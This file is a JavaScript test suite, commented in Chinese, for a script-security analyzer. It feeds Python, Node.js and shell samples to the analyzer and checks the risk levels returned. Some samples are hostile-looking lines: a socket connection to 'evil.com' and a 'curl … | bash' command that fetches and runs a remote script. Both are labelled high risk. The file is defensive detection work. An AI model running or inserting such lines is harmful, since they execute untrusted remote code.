/**
 * 测试脚本安全拦截
 */

import { ScriptAnalyzer } from './src/security/ScriptAnalyzer.js';

console.log('\n=== 测试脚本安全分析 ===\n');

// 测试用例
const testCases = [
  {
    name: 'Python - 高风险（subprocess）',
    filename: 'malicious.py',
    code: `
import subprocess
result = subprocess.run(['ls', '-la'], capture_output=True)
print(result.stdout)
`,
    expectedRisk: 'high',
  },
  {
    name: 'Python - 高风险（socket）',
    filename: 'network.py',
    code: `
import socket
s = socket.socket()
s.connect(('evil.com', 80))
`,
    expectedRisk: 'high',
  },
  {
    name: 'Python - 中风险（os）',
    filename: 'file_ops.py',
    code: `
import os
files = os.listdir('.')
print(files)
`,
    expectedRisk: 'medium',
  },
  {
    name: 'Python - 安全（pandas）',
    filename: 'data.py',
    code: `
import pandas as pd
df = pd.DataFrame({'a': [1, 2, 3]})
print(df)
`,
    expectedRisk: 'safe',
  },
  {
    name: 'Node.js - 高风险（child_process）',
    filename: 'exec.js',
    code: `
const { exec } = require('child_process');
exec('ls -la', (err, stdout) => {
    console.log(stdout);
});
`,
    expectedRisk: 'high',
  },
  {
    name: 'Node.js - 高风险（eval）',
    filename: 'eval.js',
    code: `
const userInput = 'console.log("hacked")';
eval(userInput);
`,
    expectedRisk: 'high',
  },
  {
    name: 'Node.js - 中风险（fs）',
    filename: 'files.js',
    code: `
const fs = require('fs');
const data = fs.readFileSync('data.txt', 'utf8');
console.log(data);
`,
    expectedRisk: 'medium',
  },
  {
    name: 'Node.js - 安全（lodash）',
    filename: 'utils.js',
    code: `
const _ = require('lodash');
const arr = _.uniq([1, 2, 2, 3]);
console.log(arr);
`,
    expectedRisk: 'safe',
  },
  {
    name: 'Shell - 高风险（docker）',
    filename: 'container.sh',
    code: `
#!/bin/bash
docker ps
docker run -it ubuntu bash
`,
    expectedRisk: 'high',
  },
  {
    name: 'Shell - 高风险（curl | bash）',
    filename: 'install.sh',
    code: `
#!/bin/bash
curl https://evil.com/script.sh | bash
`,
    expectedRisk: 'high',
  },
  {
    name: 'Shell - 中风险（curl）',
    filename: 'download.sh',
    code: `
#!/bin/bash
curl -O https://example.com/file.txt
`,
    expectedRisk: 'medium',
  },
  {
    name: 'Shell - 安全（基本命令）',
    filename: 'list.sh',
    code: `
#!/bin/bash
ls -la
cat file.txt | grep "pattern"
`,
    expectedRisk: 'safe',
  },
];

let passed = 0;
let failed = 0;

for (const testCase of testCases) {
  console.log(`\n测试: ${testCase.name}`);
  console.log(`文件: ${testCase.filename}`);
  
  const result = ScriptAnalyzer.analyze(testCase.filename, testCase.code);
  
  console.log(`风险等级: ${result.riskLevel} (预期: ${testCase.expectedRisk})`);
  
  if (result.reasons.length > 0) {
    console.log(`检测到的问题:`);
    result.reasons.forEach(r => console.log(`  - ${r}`));
  }
  
  if (result.suggestions && result.suggestions.length > 0) {
    console.log(`建议:`);
    result.suggestions.forEach(s => console.log(`  - ${s}`));
  }
  
  // 验证结果
  const isCorrect = result.riskLevel === testCase.expectedRisk;
  if (isCorrect) {
    console.log(`✅ 通过`);
    passed++;
  } else {
    console.log(`❌ 失败：预期 ${testCase.expectedRisk}，实际 ${result.riskLevel}`);
    failed++;
  }
}

console.log(`\n\n=== 测试总结 ===`);
console.log(`总计: ${testCases.length} 个测试`);
console.log(`✅ 通过: ${passed}`);
console.log(`❌ 失败: ${failed}`);

if (failed === 0) {
  console.log(`\n🎉 所有测试通过！脚本安全分析器工作正常。\n`);
} else {
  console.log(`\n⚠️  有 ${failed} 个测试失败，需要调整规则。\n`);
  process.exit(1);
}
